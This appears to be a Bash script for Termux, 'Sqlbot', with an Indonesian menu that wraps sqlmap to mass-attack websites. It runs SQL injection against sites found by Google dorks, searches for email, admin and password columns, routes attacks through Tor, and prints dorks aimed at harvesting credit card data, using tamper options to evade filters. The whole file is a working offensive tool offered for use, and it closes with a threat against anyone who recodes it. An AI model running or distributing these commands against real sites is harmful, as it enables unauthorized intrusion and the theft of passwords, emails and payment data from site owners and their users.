#!/usr/bin/bash
#Copyright© 2018 By Fajar Fajar Firdaus
clear
pkg install python2 -y
pkg install toilet -y
pkg install figlet -y
pkg install git -y
git clone https://github.com/sqlmapproject/sqlmap
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
sleep 1
toilet -f future.tlf +---+Sqlbot+---+ --gay
cd sqlmap
echo ""
echo "'\033[35;1m'"
echo "<==========================================>"
echo $purple "Coder : Fajar Firdaus"
echo $purple "Fb : https://www.facebook.com/Ace.of.spades729"
echo $purple "IG : fajar_firdaus_7"
echo $purple "YT : iTech7732"
echo "<==========================================>"
echo "'\033[35;1m'"
echo ""
echo "'\033[31;1m'"
echo "[#]=======================================[#]"
echo $red "1.> Hack Database Dengan Dork"
echo $red "2.> Auto Dump Email "
echo $red "3.> Cari Password admin"
echo $red "4.> Hack Database dengan tor"
echo $red "5.> Auto Dump Cc"
echo $red "0.> Exit"
echo "[#]=======================================[#]"
echo "'\033[31;1m'"
echo ""
read -p "root@Sqlbot-#" bcd

if [ $bcd = 1 ] || [ $bcd = 1 ]
then
clear
read -p "<==========> Masukan Dork <==========> :" dork
python2 sqlmap.py -g $dork --dbs --batch --tamper=space2comment --keep-alive --risk=2 --level=2 --smart --flush-session --output=Hasil
echo "Done! Lihat Hasil Dump di folder Hasil"
fi

if [ $bcd = 2 ] || [ $bcd = 2]
then
clear
read -p "<==========> Masukan Hostname Website <==========> :" host
python2 sqlmap.py -u $host --dbs --batch --tamper=space2comment --risk=2 --level=2 --flush-session --search -C mail --output=Hasil_Mail
echo "Done! Lihat Hasil Dump di folder Hasil_Mail"
fi

if [ $bcd = 3 ] || [ $bcd = 3 ]
then
clear
read -p "<==========> Masukan Hostname Website <==========> :" host
python2 sqlmap.py -u $host --dbs --batch --tamper=space2comment --search -C admin,password --level=2 --risk=2 --output=Hasil_Admin_Password
echo "Done! Lihat Hasil Dump di folder Hasil_Admin_Password"
fi

if [ $bcd = 4 ] || [ $bcd = 4 ]
then
clear
echo "Note : Untuk menajalankan dump tor diharuskan menyalakan tor"
sleep 2
echo "Buka New session lalu nyalakan tor dengan mengetik tor "
sleep 2
python2 sqlmap.py
read -p "<==========> Masukan Hostname Website <==========> :" host
python2 sqlmap.py -u $host --dbs --batch --tor --tamper=space2comment --risk=2 --level=2 --output=tor_dump
echo "Done! Lihat Hasil Dump di tor_dump"
fi

if [ $bcd = 5 ] || [ $bcd = 5 ]
then
clear
sleep 1
echo "---> List Dork <---"
sleep 1
echo "inurl:index.cfm?pageid="
sleep 1
echo "inurl:category.asp?catid="
sleep 1
echo "inurl:productlist.cfm?catalogid="
sleep 1
echo "inurl:viewitem.asp?catalogid="
sleep 1
echo "---> List Dork <---"
sleep 1
echo "Tinggal Copas cuk"
sleep 2
python2 sqlmap.py
read -p "<==========> Masukan Dork <==========> :" dork
python2 sqlmap.py -g $dork --dbs --batch --tamper=space2comment --tamper=space2comment --search -C mail,password --keep-alive --level=2 --risk=2 --flush-session --smart --output=CC
fi

if [ $bcd = 0 ] || [ $bcd = 00 ]
then
clear
sleep 1
echo "Terimakasih Telah Menggunakan Tools ini :)"
sleep 2
echo "Recode Gw bacok lo !!!!!!!"
exit
fi
